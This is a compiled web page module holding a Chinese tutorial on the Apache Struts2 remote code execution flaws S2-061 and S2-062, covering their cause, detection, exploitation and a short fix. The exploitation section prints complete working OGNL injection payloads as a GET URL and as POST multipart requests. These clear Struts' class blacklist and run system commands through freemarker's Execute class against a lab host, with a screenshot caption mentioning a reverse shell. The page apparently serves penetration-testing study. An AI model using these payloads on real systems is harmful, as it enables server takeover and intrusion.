import{_ as e,W as a,X as s,a1 as n}from"./framework-b6a07282.js";const t="/assets/4-a12b2a3b.jpg",c="/assets/5-6f72bc93.jpg",i="/assets/1-5e5d83b3.jpg",r="/assets/2-43fa3760.jpg",l="/assets/3-ef3f10f7.jpg",d={},o=n(`<h2 id="struts2-rce漏洞" tabindex="-1"><a class="header-anchor" href="#struts2-rce漏洞" aria-hidden="true">#</a> Struts2 RCE漏洞</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><h4 id="s2-061-cve-2020-17530" tabindex="-1"><a class="header-anchor" href="#s2-061-cve-2020-17530" aria-hidden="true">#</a> S2-061（CVE-2020-17530）</h4><ul><li>S2-061漏洞是一个Apache Struts2框架的远程代码执行漏洞。该项目使用了%{}解析OGNL表达式。某些标签属性可被二次解析，如果没有对用户输入的内容进行过滤，则攻击者可以通过构造恶意的OGNL表达式从而实现远程代码执行。</li></ul><p>影响范围：</p><ul><li>Apache Struts 2.0.0到2.5.25版本</li></ul><h4 id="s2-062-cve-2021-31805" tabindex="-1"><a class="header-anchor" href="#s2-062-cve-2021-31805" aria-hidden="true">#</a> S2-062（CVE-2021-31805）</h4><ul><li>S2-062漏洞（CVE-2021-31805）是一个Apache Struts2中的远程代码执行漏洞。由于对S2-061修复的不完善，仍有一些特殊的标签属性可被二次解析，如果没有对用户输入的内容进行过滤，攻击者可通过构造恶意的OGNL表达式从而实现远程代码执行。</li></ul><p>影响范围：</p><ul><li>Apache Struts 2.0.0到2.5.29版本</li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><h4 id="s2-061-cve-2020-17530-1" tabindex="-1"><a class="header-anchor" href="#s2-061-cve-2020-17530-1" aria-hidden="true">#</a> S2-061（CVE-2020-17530）</h4><ul><li>使用%{}解析OGNL表达式，对Struts2的某些标签属性的属性值进行二次表达式解析的时，如果没有对用户输入的内容进行过滤，则可能会存在远程代码执行。</li><li>使用BeanMap调用setBean()方法去更新对象，使用memberAccess的setExcludedPackageNames()和setExcludedClasses()去清空黑名单，最后实例化了之前的黑名单类Execute，通过Execute使用exec方法执行命令。</li></ul><h4 id="s2-062-cve-2021-31805-1" tabindex="-1"><a class="header-anchor" href="#s2-062-cve-2021-31805-1" aria-hidden="true">#</a> S2-062（CVE-2021-31805）</h4><ul><li>通过使用%{}解析OGNL表达式，使用@来绕过安全检查，然后使用BeanMap调用setBean()方法去更新对象，使用memberAccess的setExcludedPackageNames()和setExcludedClasses()去清空黑名单，最后实例化了之前的黑名单类Execute，通过Execute使用exec方法执行命令。</li></ul><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><ol><li>通过发送http请求来查看是否存在命令执行</li></ol><h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ul><li>远程代码执行（RCE）</li></ul><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><h4 id="s2-061-cve-2020-17530-2" tabindex="-1"><a class="header-anchor" href="#s2-061-cve-2020-17530-2" aria-hidden="true">#</a> S2-061（CVE-2020-17530）</h4><h5 id="通过get方式发送恶意ognl表达式执行任意命令" tabindex="-1"><a class="header-anchor" href="#通过get方式发送恶意ognl表达式执行任意命令" aria-hidden="true">#</a> 通过GET方式发送恶意OGNL表达式执行任意命令</h5><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://192.168.0.137:8080/?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27id%27}).(%23res%3d%23exec.exec(%23cmd))}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><img src="`+t+`"><h5 id="通过post方式发送恶意ognl表达式执行任意命令" tabindex="-1"><a class="header-anchor" href="#通过post方式发送恶意ognl表达式执行任意命令" aria-hidden="true">#</a> 通过POST方式发送恶意OGNL表达式执行任意命令</h5><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.0.137:8080</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">JSESSIONID=node01jl2mw4dwuk4c1t424vx7mvevs0.node0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">837</span></span>

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name=&quot;id&quot;</span></span>

%{(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;whoami&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+c+'"><h4 id="s2-062-cve-2021-31805-2" tabindex="-1"><a class="header-anchor" href="#s2-062-cve-2021-31805-2" aria-hidden="true">#</a> S2-062（CVE-2021-31805）</h4><h5 id="使用s2-062-py工具进行利用" tabindex="-1"><a class="header-anchor" href="#使用s2-062-py工具进行利用" aria-hidden="true">#</a> 使用s2-062.py工具进行利用</h5><img src="'+i+`"><h5 id="通过post方式发送恶意ognl表达式执行任意命令-1" tabindex="-1"><a class="header-anchor" href="#通过post方式发送恶意ognl表达式执行任意命令-1" aria-hidden="true">#</a> 通过POST方式发送恶意OGNL表达式执行任意命令</h5><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/index.action</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.0.137:8080</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">JSESSIONID=node01c863u8lzu8eyn099a51bjyie0.node0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1098</span></span>

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name=&quot;id&quot; </span></span>

%{
(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map.setBean(#request.get(&#39;struts.valueStack&#39;)) == true).toString().substring(0,0) +
(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map2.setBean(#request.get(&#39;map&#39;).get(&#39;context&#39;)) == true).toString().substring(0,0) +
(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map3.setBean(#request.get(&#39;map2&#39;).get(&#39;memberAccess&#39;)) == true).toString().substring(0,0) +
(#request.get(&#39;map3&#39;).put(&#39;excludedPackageNames&#39;,#@org.apache.commons.collections.BeanMap@{}.keySet()) ==
true).toString().substring(0,0) +
(#request.get(&#39;map3&#39;).put(&#39;excludedClasses&#39;,#@org.apache.commons.collections.BeanMap@{}.keySet()) ==
true).toString().substring(0,0) +
(#application.get(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;freemarker.template.utility.Execute&#39;).exec({&#39;命令&#39;}))
}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF—
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><table><thead><tr><th>描述</th><th>效果</th></tr></thead><tbody><tr><td>通过http请求执行id命令</td><td><img src="`+r+'"></td></tr><tr><td>通过http请求执行反弹shell</td><td><img src="'+l+'"></td></tr></tbody></table><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><ol><li>升级到Apache Struts 2.5.30或更高版本。</li><li>在struts.xml中设置struts.ognl.allowStaticMethodAccess为false。但是，这可能会影响一些功能。</li></ol><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3><ul><li>暂无</li></ul><h3 id="补充知识" tabindex="-1"><a class="header-anchor" href="#补充知识" aria-hidden="true">#</a> 补充知识</h3><h4 id="ognl" tabindex="-1"><a class="header-anchor" href="#ognl" aria-hidden="true">#</a> OGNL</h4><ul><li><p>对象图导航语言（Object-Graph Navigation Language），一种开源的 Java 表达式语言，用于对数据进行访问，拥有类型转换、访问对象方法、操作集合对象等功能。</p></li><li><p>OGNL是Struts默认支持的表达式语言，OGNL可以取值赋值、访问类的静态方法和属性。</p></li><li><p>%{}用来把字符串转换成表达式</p></li></ul><h4 id="struts2" tabindex="-1"><a class="header-anchor" href="#struts2" aria-hidden="true">#</a> Struts2</h4><ul><li>Struts2是一个基于MVC设计模式的Web应用框架，它可以作为控制器来建立模型与视图的数据交互。</li></ul>',42),p=[o];function u(h,m){return a(),s("div",null,p)}const k=e(d,[["render",u],["__file","Struts2 RCE漏洞.html.vue"]]);export{k as default};
